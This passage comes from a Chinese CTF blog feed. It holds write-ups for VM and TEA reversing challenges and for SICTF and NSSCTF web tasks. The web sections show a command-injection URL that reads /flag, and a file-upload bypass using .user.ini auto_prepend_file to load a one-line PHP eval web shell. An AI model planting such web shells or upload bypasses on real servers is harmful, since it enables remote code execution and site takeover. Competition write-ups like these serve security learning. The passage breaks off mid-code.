<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sup reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shl reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shr reg[%d],reg[%d]&quot;</span> % (opcode[i + <span class="hljs-number">2</span>], opcode[i + <span class="hljs-number">3</span>]))<br>            i += <span class="hljs-number">4</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x04</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> cmp reg[0], reg[1]&#x27;</span>)<br>            i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x05</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> jmp %d &#x27;</span> % (opcode[i+<span class="hljs-number">1</span>]))<br>            i += <span class="hljs-number">2</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x06</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> je %d &#x27;</span> % (opcode[i+<span class="hljs-number">1</span>]))<br>            i += <span class="hljs-number">2</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x07</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> jne %d &#x27;</span> % (opcode[i+<span class="hljs-number">1</span>]))<br>            i += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li><li>输出和分析<br>0 mov reg[2], 0<br>4 add reg[2],reg[3]<br>8 mov reg[0], input[reg[2]]<br>12 mov reg[1], reg[0]<br>&#x2F;&#x2F;前四局  用于数据的初始化<br>16 mov reg[2], 50<br>20 add reg[2],reg[3]<br>24 mov reg[0], input[reg[2]]<br>28 add reg[1],reg[0]<br>&#x2F;&#x2F;以50为分界线，将新的数据与原来的reg[1]相加相当于数组之间全部加一遍<br>32 mov reg[2], 100<br>36 add reg[2],reg[3]<br>40 mov reg[0], input[reg[2]]<br>44 xor reg[1],reg[0]<br>&#x2F;&#x2F;以100为分界线，将新的数据与原来的reg[1]进行异或<br>48 mov reg[0], 8<br>52 mov reg[2], reg[1]<br>56 shl reg[1],reg[0]<br>60 shr reg[2],reg[0]<br>64 add reg[1],reg[2]<br>68 mov reg[0], reg[1]<br>72 push reg[0]<br>&#x2F;&#x2F;这一步是将reg[0]置为8，然后进行左移右移操作，最后将结果加到reg[1]上，并将结果压入栈中<br>74 mov reg[0], 1<br>78 add reg[3],reg[0]<br>82 mov reg[0], reg[3]<br>86 mov reg[1], 40<br>90 cmp reg[0], reg[1]<br>91 je 95<br>93 jmp 0<br>95 mov reg[3], 0<br>&#x2F;&#x2F;这个代表的是将上面的过程重复40次<br>99 pop reg[1]<br>101 mov reg[2], 150<br>105 add reg[2],reg[3]<br>109 mov reg[0], input[reg[2]]<br>113 cmp reg[0], reg[1]<br>114 jne 136<br>&#x2F;&#x2F;这个是将栈中的数据与150号位置的数据进行比较，如果相同则跳转到136，否则跳转到0<br>116 mov reg[0], 1<br>120 add reg[3],reg[0]<br>124 mov reg[0], reg[3]<br>128 mov reg[1], 40<br>132 cmp reg[0], reg[1]<br>133 jne 99<br>&#x2F;&#x2F;循环四十次回到99，好像是干扰项</li></ul><p>函数就是这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = []  <br>a1 = []  <br>a2 = []  <br>a3 = []  <br>k = a1 + flag  <br>k2 = a2 ^ k  <br>a3 = k2 &lt;&lt; <span class="hljs-number">8</span> + k2 &gt;&gt; <span class="hljs-number">8</span><br><span class="hljs-comment">#nixiang</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    k2=((a3[i])&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>+((a3[i])&lt;&lt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    k=k2^a2<br>    flag=k-a1<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py">a1 = [<span class="hljs-number">155</span>, <span class="hljs-number">168</span>, <span class="hljs-number">2</span>, <span class="hljs-number">188</span>, <span class="hljs-number">172</span>, <span class="hljs-number">156</span>, <span class="hljs-number">206</span>, <span class="hljs-number">250</span>, <span class="hljs-number">2</span>, <span class="hljs-number">185</span>, <span class="hljs-number">255</span>, <span class="hljs-number">58</span>, <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">25</span>, <span class="hljs-number">105</span>, <span class="hljs-number">232</span>, <span class="hljs-number">3</span>, <span class="hljs-number">203</span>, <span class="hljs-number">201</span>,<br>      <span class="hljs-number">255</span>, <span class="hljs-number">252</span>, <span class="hljs-number">128</span>, <span class="hljs-number">214</span>, <span class="hljs-number">141</span>, <span class="hljs-number">215</span>, <span class="hljs-number">114</span>, <span class="hljs-number">0</span>, <span class="hljs-number">167</span>, <span class="hljs-number">29</span>, <span class="hljs-number">61</span>, <span class="hljs-number">153</span>, <span class="hljs-number">136</span>, <span class="hljs-number">153</span>, <span class="hljs-number">191</span>, <span class="hljs-number">232</span>, <span class="hljs-number">150</span>, <span class="hljs-number">46</span>, <span class="hljs-number">93</span>, <span class="hljs-number">87</span>]<br>a2 = [<span class="hljs-number">201</span>, <span class="hljs-number">169</span>, <span class="hljs-number">189</span>, <span class="hljs-number">139</span>, <span class="hljs-number">23</span>, <span class="hljs-number">194</span>, <span class="hljs-number">110</span>, <span class="hljs-number">248</span>, <span class="hljs-number">245</span>, <span class="hljs-number">110</span>, <span class="hljs-number">99</span>, <span class="hljs-number">99</span>, <span class="hljs-number">213</span>, <span class="hljs-number">70</span>, <span class="hljs-number">93</span>, <span class="hljs-number">22</span>, <span class="hljs-number">152</span>, <span class="hljs-number">56</span>, <span class="hljs-number">48</span>, <span class="hljs-number">115</span>, <span class="hljs-number">56</span>,<br>      <span class="hljs-number">193</span>, <span class="hljs-number">94</span>, <span class="hljs-number">237</span>, <span class="hljs-number">176</span>, <span class="hljs-number">41</span>, <span class="hljs-number">90</span>, <span class="hljs-number">24</span>, <span class="hljs-number">64</span>, <span class="hljs-number">167</span>, <span class="hljs-number">253</span>, <span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">120</span>, <span class="hljs-number">139</span>, <span class="hljs-number">98</span>, <span class="hljs-number">219</span>, <span class="hljs-number">15</span>, <span class="hljs-number">143</span>, <span class="hljs-number">156</span>]<br>a3 = [<span class="hljs-number">18432</span>, <span class="hljs-number">61696</span>, <span class="hljs-number">16384</span>, <span class="hljs-number">8448</span>, <span class="hljs-number">13569</span>, <span class="hljs-number">25600</span>, <span class="hljs-number">30721</span>, <span class="hljs-number">63744</span>, <span class="hljs-number">6145</span>, <span class="hljs-number">20992</span>, <span class="hljs-number">9472</span>, <span class="hljs-number">23809</span>, <span class="hljs-number">18176</span>, <span class="hljs-number">64768</span>, <span class="hljs-number">26881</span>, <span class="hljs-number">23552</span>,<br>      <span class="hljs-number">44801</span>, <span class="hljs-number">45568</span>, <span class="hljs-number">60417</span>,<br>      <span class="hljs-number">20993</span>, <span class="hljs-number">20225</span>, <span class="hljs-number">6657</span>, <span class="hljs-number">20480</span>, <span class="hljs-number">34049</span>, <span class="hljs-number">52480</span>, <span class="hljs-number">8960</span>, <span class="hljs-number">63488</span>, <span class="hljs-number">3072</span>, <span class="hljs-number">52992</span>, <span class="hljs-number">15617</span>, <span class="hljs-number">17665</span>, <span class="hljs-number">33280</span>, <span class="hljs-number">53761</span>, <span class="hljs-number">10497</span>, <span class="hljs-number">54529</span>, <span class="hljs-number">1537</span>,<br>      <span class="hljs-number">41473</span>, <span class="hljs-number">56832</span>, <span class="hljs-number">42497</span>, <span class="hljs-number">51713</span>]<br>a4 = a3[::-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># a4 = [51713, 42497, 56832, 41473, 1537, 54529, 10497, 53761, 33280, 17665, 15617, 52992, 3072, 63488, 8960, 52480, 34049, 20480, 6657, 20225, 20993, 60417, 45568, 44801, 23552, 26881, 64768, 18176, 23809, 9472, 20992, 6145, 63744, 30721, 25600, 13569, 8448, 16384, 61696, 18432]</span><br>flag = [<span class="hljs-number">0</span>] * <span class="hljs-number">40</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    flag[i] = ((a4[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span> + (a4[i] &lt;&lt; <span class="hljs-number">8</span>))<br>    flag[i] ^= a2[i]<br>    flag[i] -= a1[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(a&amp;<span class="hljs-number">0xff</span>) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> flag]))<br><br><span class="hljs-comment"># hgame&#123;y0ur_rever5e_sk1ll_i5_very_g0od!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="强网杯-2024-easy-vm"><a href="#强网杯-2024-easy-vm" class="headerlink" title="[强网杯 2024 easy_vm]"></a>[强网杯 2024 easy_vm]</h2><p>接触完了去年的我们来看看强网杯的vm吧</p><ul><li>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021111059.png" srcset="/img/loading.gif" lazyload></li><li>ida分析<br><img src="https://gitee.com/fogpost/photo/raw/master/202411021116697.png" srcset="/img/loading.gif" lazyload><br>这次的区块有点大，我们逐段来分析一下</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctf-vm虚拟机&quot;&gt;&lt;a href=&quot;#ctf-vm虚拟机&quot; class=&quot;headerlink&quot; title=&quot;ctf_vm虚拟机&quot;&gt;&lt;/a&gt;ctf_vm虚拟机&lt;/h1&gt;&lt;p&gt;最近打些大比赛果然都有这个虚拟机，但是本人学的不够精细，这次强网杯又有了，借此机会来</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sicctfwp</title>
    <link href="https://fogpost.top/2024/11/01/sicctfwp/"/>
    <id>https://fogpost.top/2024/11/01/sicctfwp/</id>
    <published>2024-11-01T14:15:18.000Z</published>
    <updated>2024-11-01T15:37:59.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Sigin"><a href="#Sigin" class="headerlink" title="Sigin"></a>Sigin</h2><p>打开网页后出现这个页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012216221.png" srcset="/img/loading.gif" lazyload><br>典型的robots协议，访问robots.txt<br>按照提示进入，发现一下界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012217411.png" srcset="/img/loading.gif" lazyload><br>在本地弄一个php环境跑一下出了这个</p><blockquote><p>system(get_deined_vars()[_GET)][W3lc0me_t0_SICTF.2024])  </p></blockquote><p>简单来说就是将W3lc0me_t0_SICTF.2024作为system的get参数，多亏了有蒋✌教,这里存在一个php特性就是不能过多的下划线要改为W3lc0me_t0[SICTF.2024这个才行</p><blockquote><p><a href="http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0%5BSICTF.2024=cat">http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0[SICTF.2024=cat</a> &#x2F;flag<br>SICTF{e79dbf83-bce6-4545-a9d7-53c527f3f13c} </p></blockquote><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Exc"><a href="#Exc" class="headerlink" title="Exc??"></a>Exc??</h2><p>感觉和之前moectf的一个很像，直接打开看看<br>将这个xlsx分为一下几个模块</p><ul><li>输入输出模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012230759.png" srcset="/img/loading.gif" lazyload></li><li>算法模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012231237.png" srcset="/img/loading.gif" lazyload><br>先看wrong格中的内容</li></ul><blockquote><p>IF(C3&#x3D;D19,IF(F3&#x3D;G19,IF(I3&#x3D;J19,IF(L3&#x3D;D21,IF(O3&#x3D;G21,IF(R3&#x3D;J21,IF(U3&#x3D;D23,IF(X3&#x3D;G23,IF(AA3&#x3D;J23,</p></blockquote><blockquote><p>IF(D13&#x3D;Q19,IF(G13&#x3D;T19,IF(J13&#x3D;W19,IF(D15&#x3D;Q21,IF(G15&#x3D;T21,IF(J15&#x3D;W21,IF(D17&#x3D;Q23,IF(G17&#x3D;T23,IF(J17&#x3D;W23,</p></blockquote><blockquote><p>IF(D31&#x3D;AT10,IF(G31&#x3D;AW10,IF(J31&#x3D;AZ10,IF(M31&#x3D;AT12,IF(P31&#x3D;AW12,IF(S31&#x3D;AZ12,IF(V31&#x3D;AT14,IF(Y31&#x3D;AW14,IF(AB31&#x3D;AZ14,”Accepted!”)))))))))))))))))))))))))))</p></blockquote><p>  发现存在一个accpted，去找这个实现条件，发现是输入输出模块中的数要与算法模块中的紫色数据块相同<br>继续找紫色output的实现函数</p><p>分别如下<br>&#x3D;BITLSHIFT(CODE(C2),3)+BITLSHIFT(CODE(D2),4)+BITLSHIFT(CODE(E2),5)<br>第二个是<br>&#x3D;CODE(C2)*3+CODE(D2)*4+CODE(E2)*5<br>第三个是<br>&#x3D;CODE(C2)*CODE(D2)+CODE(D2)*CODE(E2)+CODE(E2)*CODE(C2)</p><p>解释一下几个函数<br>BITLSHIFT(number, shift_amount)：执行左移操作<br>CODE(text)：将文本转换为ASCII码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">enc = [<span class="hljs-number">3976</span>, <span class="hljs-number">5728</span>, <span class="hljs-number">5640</span>, <span class="hljs-number">4232</span>, <span class="hljs-number">5272</span>, <span class="hljs-number">3776</span>, <span class="hljs-number">6464</span>, <span class="hljs-number">6136</span>, <span class="hljs-number">5408</span>]<br>enc1 = [<span class="hljs-number">876</span>, <span class="hljs-number">1147</span>, <span class="hljs-number">1182</span>, <span class="hljs-number">824</span>, <span class="hljs-number">1082</span>, <span class="hljs-number">866</span>, <span class="hljs-number">1361</span>, <span class="hljs-number">1278</span>, <span class="hljs-number">1087</span>]<br>enc2 = [<span class="hljs-number">16511</span>, <span class="hljs-number">24822</span>, <span class="hljs-number">26991</span>, <span class="hljs-number">11999</span>, <span class="hljs-number">21215</span>, <span class="hljs-number">16374</span>, <span class="hljs-number">37800</span>, <span class="hljs-number">32739</span>, <span class="hljs-number">21505</span>]<br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>):<br>    found = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 初始化找到标志</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>                <span class="hljs-comment"># 使用 and 代替 &amp;</span><br>                <span class="hljs-keyword">if</span> (i * <span class="hljs-number">8</span> + j * <span class="hljs-number">16</span> + k * <span class="hljs-number">32</span> == enc[l] <span class="hljs-keyword">and</span> <br>                    i * <span class="hljs-number">3</span> + j * <span class="hljs-number">4</span> + k * <span class="hljs-number">5</span> == enc1[l] <span class="hljs-keyword">and</span> <br>                    i * j + j * k + k * i == enc2[l]):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(i)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(k)&#125;</span>&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>                    found = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 设置找到标志</span><br>                    <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 跳出内层循环</span><br>            <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出中间循环</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出外层循环</span><br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>SICTF{Exc31_1s_r3@lly_fun!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Sigin&quot;&gt;&lt;a href=&quot;#Sigin&quot; class=&quot;headerlink&quot; title=&quot;Sigin&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://fogpost.top/categories/CTF/"/>
    
    
    <category term="ctf" scheme="https://fogpost.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>nssctf2024秋季回顾</title>
    <link href="https://fogpost.top/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/"/>
    <id>https://fogpost.top/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/</id>
    <published>2024-10-31T12:18:03.000Z</published>
    <updated>2024-11-07T11:31:28.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nssctf2024秋季回顾"><a href="#nssctf2024秋季回顾" class="headerlink" title="nssctf2024秋季回顾"></a>nssctf2024秋季回顾</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛也算是打的比较舒服的一个比赛，不过后期有点懈怠了，有许多题都没有看主要是没有什么想法吧，回顾主要是把不会的和想学习的写一下，已经出来的就不打算再写了</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="NSS茶馆"><a href="#NSS茶馆" class="headerlink" title="NSS茶馆"></a>NSS茶馆</h3><p>这个题没想到是tea，最近接触少了，敏感度骤然下降，还是要好好把握一下</p><ul><li>先是查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312022329.png" srcset="/img/loading.gif" lazyload></li><li>老样子32位启动<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312040919.png" srcset="/img/loading.gif" lazyload><br>在这个图中的sub_411118便是我们的解密函数，判断函数<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312046855.png" srcset="/img/loading.gif" lazyload><br>tea本体<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312047549.png" srcset="/img/loading.gif" lazyload><br>解题脚本<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v,<span class="hljs-type">uint32_t</span> * k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">1131796</span>*<span class="hljs-number">33</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">1131796</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">33</span>; i++)&#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        sum -=delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">uint32_t</span> values[<span class="hljs-number">2</span>];<br>&#125; Data;<br><br><span class="hljs-comment">// unsigned char enc[] =</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//   0x65, 0xD2, 0x26, 0x3A, 0xB6, 0xA0, 0xD9, 0x81, 0x2A, 0x00, </span><br><span class="hljs-comment">//   0x5E, 0x0E, 0xE5, 0xEF, 0x07, 0x39, 0x57, 0xBC, 0xB6, 0x71, </span><br><span class="hljs-comment">//   0xA2, 0x0D, 0xAC, 0xE0</span><br><span class="hljs-comment">// &#125;;</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    Data v[<span class="hljs-number">3</span>]=&#123;&#123;<span class="hljs-number">0x3A26D265</span>,<span class="hljs-number">0x81D9A0B6</span>&#125;,&#123;<span class="hljs-number">0x0E5E002A</span>,<span class="hljs-number">0x3907EFE5</span>&#125;,&#123;<span class="hljs-number">0x71B6BC57</span>,<span class="hljs-number">0xE0AC0DA2</span>&#125;&#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0x0B</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2C</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">decrypt</span>(v[i].values,k);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;decrtp:%x %x\n&quot;</span>,v[i].values[<span class="hljs-number">0</span>],v[i].values[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>结果是这个<br>decrtp:4e535343 54467b74<br>decrtp:65615f69 735f736f<br>decrtp:5f656173 7921217d<br>直接就是hex转chr了<br><img src="https://gitee.com/fogpost/photo/raw/master/202410312118868.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{tea_is_so_easy!!}</li></ul><h3 id="MD5爆破"><a href="#MD5爆破" class="headerlink" title="MD5爆破"></a>MD5爆破</h3><p>纯手撸，题解也看不懂，脚本都跑不动</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>开头就是一个文件上传页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011425977.png" srcset="/img/loading.gif" lazyload><br>我们选择一个文件直接上传，png可以上传，对php有过滤<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011439740.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011440878.png" srcset="/img/loading.gif" lazyload><br>然后我们尝试抓包并修改数据，可以成功上传，尝试访问<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442332.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011442165.png" srcset="/img/loading.gif" lazyload><br>其中也尝试了其他的后缀，不过可以上传但是不可以解析，按照别人的wp来看，好像是uploads目录下有一个notion.php文件<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011454711.png" srcset="/img/loading.gif" lazyload><br>尝试上传.user.ini</p><blockquote><p>.user.ini 是⼀个⽤户⾃定义的php.ini ⽂件，会在其所在的当前⽬录⽣效，优先级⾼于php.ini<br>在user.ini中写⼊以下内容<br>auto_prepend_file &#x3D; &lt;filename&gt;    &#x2F;&#x2F;包含在⽂件头<br>auto_append_file &#x3D; &lt;filename&gt;      &#x2F;&#x2F;包含在⽂件尾<br>写⼊其中⼀个即可<br>&lt;filename&gt;就写成需要包含的⽂件名，后缀任意上传后，该⽬录下的php⽂件就会⾃动包含&lt;filename&gt;<br>.user.ini</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = 外部文件包含.png<br><span class="hljs-attr">auto_append_file</span> = 外部文件包含.png <br></code></pre></td></tr></table></figure><p>外部文件包含.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用蚁剑成功连接<br><img src="https://gitee.com/fogpost/photo/raw/master/202411011528057.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411011529825.png" srcset="/img/loading.gif" lazyload><br>NSSCTF{11822be1-0c76-4bc8-9f67-82fcf3f3ec33}</p><h3 id="未选择的路"><a href="#未选择的路" class="headerlink" title="未选择的路"></a>未选择的路</h3><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code 